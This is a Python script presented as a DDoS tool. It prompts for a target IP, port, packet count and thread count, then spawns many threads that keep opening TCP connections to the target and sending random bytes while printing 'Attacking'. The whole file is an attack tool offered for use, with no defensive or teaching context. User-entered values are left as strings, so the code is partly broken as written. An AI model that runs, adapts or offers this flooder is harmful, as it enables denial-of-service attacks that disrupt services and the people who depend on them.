import socket 
import random
import threading
import time
import os
import colorama
import ctypes
import pyfiglet

ctypes.windll.kernel32.SetConsoleTitleW("DDoS | Tarantino Andrea")
os.system("color 4")
os.system("cls")

ascii_banner = pyfiglet.figlet_format("DDoS")
print(ascii_banner)

ip = (input("Enter target IP: "))
port = (input("Enter target port (default: 80): "))
pack = (input("Enter the amount of packets (default: 20): "))
threads = (input("Enter the amount of threads (default: 100): "))

if port == "":
    port = int(80)
if pack == "":
    pack = int(20)
if threads == "":
    threads = int(100)

print("-" * 50)
print("IP: " + ip)
print("Port: " + str(port))
print("Packets: " + str(pack))
print("Threads: " + str(threads))
print("-" * 50)

print("Confirm? (y/n)")
choice = input("> ")
if choice == "y":
    pass
else:
    print("Exiting...")
    time.sleep(3)
    exit()

def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print("Attacking "+ip+" | Sent: "+str(xx))
        except:
            s.close()
            print("Done")

for x in range(threads):
    thread = threading.Thread(target=start)
    thread.start()
